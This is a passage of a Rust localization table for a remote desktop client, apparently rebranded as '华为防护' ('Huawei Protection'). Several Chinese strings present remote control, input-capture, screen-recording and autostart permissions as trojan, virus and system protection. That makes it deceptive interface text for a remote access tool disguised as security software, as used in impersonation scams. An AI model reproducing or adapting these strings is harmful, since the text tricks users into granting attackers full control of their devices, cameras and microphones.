...
pub static ref T: std::collections::HashMap<&'static str, &'static str> =
    [
        ...
        ("Ready", "防护中..."),
        ("Established", "已建立"),
        ("connecting_status", "正在接入 华为防护 网络..."),
        ("Enable service", "允许服务"),
        ("Start service", "启动服务"),
        ...
        ("Set Password", "设置密码"),
        ("OS Password", "操作系统密码"),
        ("install_tip", "你正在运行未安装版本，由于 UAC 限制，作为被控端，会在某些情况下无法控制鼠标键盘，或者录制屏幕，请点击下面的按钮将 华为防护 安装到系统，从而规避上述问题。"),
        ("Click to upgrade", "点击这里升级"),
        ("Click to download", "点击这里下载"),
        ("Click to update", "点击这里更新"),
        ("Configure", "配置"),
        ("config_acc", "为了能够远程控制你的桌面, 请给予 华为防护 \"辅助功能\" 权限。"),
        ("config_screen", "为了能够远程访问你的桌面, 请给予 华为防护 \"屏幕录制\" 权限。"),
        ("Installing ...", "安装中..."),
        ("Install", "安装"),
        ("Installation", "安装"),
        ...
        ("android_input_permission_tip1", "开启木马防护"),
        ("android_input_permission_tip2", "请在接下来的系统设置页面里，找到并进入 [已安装的服务] 页面，将 [华为防护 Input] 服务开启。"),
        ("android_new_connection_tip", "收到新的连接控制请求，对方想要控制你当前的设备。"),
        ("android_service_will_start_tip", "开启病毒防护"),
        ("android_stop_service_tip", "关闭系统防护？"),
        ("android_version_audio_tip", "当前安卓版本不支持音频录制，请升级至安卓 10 或更高。"),
        ("android_start_service_tip", "点击开始服务启用安全防护功能"),
        ...
        ("Turned off", "退出"),
        ("Language", "语言"),
        ("Keep 华为防护 background service", "保持 华为防护 后台服务"),
        ("Ignore Battery Optimizations", "忽略电池优化"),
        ("android_open_battery_optimizations_tip", "如需关闭此功能，请在接下来的 华为防护 应用设置页面中，找到并进入 [电源] 页面，取消勾选 [不受限制]"),
        ("Start on boot", "开机自启动"),
        ("Start the screen sharing service on boot, requires special permissions", "开机自动启动安全防护服务，此功能需要一些特殊权限。"),
        ("Connection not allowed", "对方不允许连接"),
        ("Legacy mode", "传统模式"),
        ("Map mode", "1:1 传输"),
        ("Translate mode", "翻译模式"),
        ("Use permanent password", "使用固定防护"),
        ("Use both passwords", "同时使用两种密码"),
        ("Set permanent password", "设置固定防护"),
        ...
        ("Elevate", "提权"),
        ("Zoom cursor", "缩放光标"),
        ("Accept sessions via password", "只允许密码防护"),
        ...
        ("config_input", "为了能够通过键盘控制远程桌面, 请给予 华为防护 \"输入监控\" 权限。"),
        ("config_microphone", "为了支持通过麦克风进行音频传输，请给予 华为防护 \"录音\"权限。"),
        ...
        ("still_click_uac_tip", "依然需要被控端用户在运行 华为防护 的 UAC 窗口点击确认。"),
        ...
        ("verify_华为防护_password_tip", "验证 华为防护 密码"),
        ...
        ("upgrade_华为防护_server_pro_to_{}_tip", "请升级专业版服务器到{}或更高版本！"),
        ...
        ("selinux_tip", "SELinux 处于启用状态，华为防护 可能无法作为被控正常运行。"),
        ("Change view", "更改视图"),
        ("Big tiles", "大磁贴"),
        ("Small tiles", "小磁贴"),
        ("List", "列表"),
        ...
        ("allow-only-conn-window-open-tip", "仅当 华为防护 窗口打开时允许连接"),
        ...
        ("Floating window", "悬浮窗"),
        ("floating_window_tip", "有助于保持 华为防护 后台服务"),
        ...
        ("View camera", "查看摄像头"),
        ("upgrade_remote_华为防护_client_to_{}_tip", "请在远程端将 华为防护 客户端升级至版本 {} 或更新版本！"),
